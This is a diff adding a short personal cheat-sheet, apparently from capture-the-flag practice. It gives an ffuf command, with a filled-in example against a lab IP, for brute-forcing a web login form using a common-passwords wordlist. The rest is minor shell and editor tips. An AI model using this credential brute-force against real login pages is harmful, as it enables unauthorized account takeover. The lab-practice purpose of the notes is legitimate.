@@ -1,0 +1,19 @@
+
+### bruteforce using ffuf
+
+`ffuf -w <user_file>:W1,<password_file>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <URL> -fc 200`
+
+eg. `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/login -fc 200`
+
+### vscode:
+
+`shift + command + F` searches for selected text in all files
+
+### generic recursive search for a file, no error flood
+
+`find / -name flag.txt 2>/dev/null`
+
+
+### history cut to get only the commands
+
+`history | cut -d " " -f 5`
